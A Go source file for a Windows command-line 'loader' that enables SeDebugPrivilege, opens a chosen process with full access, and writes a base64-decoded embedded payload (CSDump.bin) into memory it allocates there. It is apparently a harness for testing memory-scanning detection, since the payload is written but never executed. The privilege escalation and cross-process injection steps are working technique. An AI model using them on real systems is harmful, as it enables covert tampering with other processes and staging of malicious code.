package main

//go:generate fileb0x b0x.yaml

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"syscall"
	"time"

	"github.com/alecthomas/kingpin"
	"golang.org/x/sys/windows"
	"www.velocidex.com/golang/loader/assets"
	_ "www.velocidex.com/golang/loader/assets"
)

const (
	MEM_COMMIT      = 0x1000
	MEM_RESERVE     = 0x2000
	MEM_DECOMMIT    = 0x4000
	MEM_RELEASE     = 0x8000
	MEM_FREE        = 0x10000
	MEM_PRIVATE     = 0x20000
	MEM_MAPPED      = 0x40000
	MEM_RESET       = 0x80000
	MEM_TOP_DOWN    = 0x100000
	MEM_WRITE_WATCH = 0x200000
	MEM_PHYSICAL    = 0x400000
	MEM_ROTATE      = 0x800000
	MEM_LARGE_PAGES = 0x20000000
	MEM_4MB_PAGES   = 0x80000000

	PAGE_NOACCESS          = 0x01
	PAGE_READONLY          = 0x02
	PAGE_READWRITE         = 0x04
	PAGE_WRITECOPY         = 0x08
	PAGE_EXECUTE           = 0x10
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_WRITECOPY = 0x80
	PAGE_GUARD             = 0x100
	PAGE_NOCACHE           = 0x200
	PAGE_WRITECOMBINE      = 0x400

	PROCESS_ALL_ACCESS                = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xffff
	PROCESS_TERMINATE                 = 0x0001
	PROCESS_CREATE_THREAD             = 0x0002
	PROCESS_SET_SESSIONID             = 0x0004
	PROCESS_VM_OPERATION              = 0x0008
	PROCESS_VM_READ                   = 0x0010
	PROCESS_VM_WRITE                  = 0x0020
	PROCESS_DUP_HANDLE                = 0x0040
	PROCESS_CREATE_PROCESS            = 0x0080
	PROCESS_SET_QUOTA                 = 0x0100
	PROCESS_SET_INFORMATION           = 0x0200
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_SUSPEND_RESUME            = 0x0800
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

	STANDARD_RIGHTS_REQUIRED = 0x000F0000
	DELETE                   = 0x00010000
	READ_CONTROL             = 0x00020000
	WRITE_DAC                = 0x00040000
	WRITE_OWNER              = 0x00080000
	SYNCHRONIZE              = 0x00100000

	STANDARD_RIGHTS_READ    = READ_CONTROL
	STANDARD_RIGHTS_WRITE   = READ_CONTROL
	STANDARD_RIGHTS_EXECUTE = READ_CONTROL

	STANDARD_RIGHTS_ALL = 0x001F0000
)

var (
	app       = kingpin.New("loader", "Inject stuff into other processes.")
	pid       = app.Arg("pid", "Pid to inject to").Required().Int()
	wait_time = app.Arg("wait_time", "How long to wait before injecting in sec.").
			Default("10").Int()
)

func main() {

	//	assets.Init()

	app.HelpFlag.Short('h')
	app.UsageTemplate(kingpin.CompactUsageTemplate)
	args := os.Args[1:]

	kingpin.MustParse(app.Parse(args))

	fmt.Printf("Waiting for %v seconds before injection\n", *wait_time)

	// Wait a bit
	time.Sleep(time.Duration(*wait_time) * time.Second)

	var token windows.Token
	var tp windows.Tokenprivileges
	var privName string = "SeDebugPrivilege"
	privStr, _ := syscall.UTF16PtrFromString(privName)
	hCurrentProc, _ := windows.GetCurrentProcess()
	windows.OpenProcessToken(hCurrentProc, syscall.TOKEN_QUERY|syscall.TOKEN_ADJUST_PRIVILEGES, &token)
	windows.LookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
	tp.PrivilegeCount = 1
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	err := windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
	if err != nil {
		log.Panic(err)
	}

	hProc, err := OpenProcess(PROCESS_ALL_ACCESS, false, uint32(*pid))
	if err != nil {
		log.Panic(err)
	}

	fmt.Printf("Opened process %v: %v\n", *pid, hProc)

	enc_data, err := assets.ReadFile("CSDump.bin")
	if err != nil {
		log.Panic(err)
	}

	// Decode the base64 data
	data, err := base64.StdEncoding.DecodeString(
		string(enc_data))
	if err != nil {
		log.Panic(err)
	}

	dwMemSize := len(data) + 1
	fmt.Printf("Will try to allocate %v bytes\n", dwMemSize)

	lpRemoteMem, err := VirtualAllocEx(
		hProc, 0, dwMemSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)
	if err != nil {
		log.Panic(err)
	}

	fmt.Printf("Allocated @ %#0x \n", lpRemoteMem)

	err = WriteProcessMemory(
		hProc, lpRemoteMem, []byte(data), uint(dwMemSize))
	if err != nil {
		log.Panic(err)
	}
}
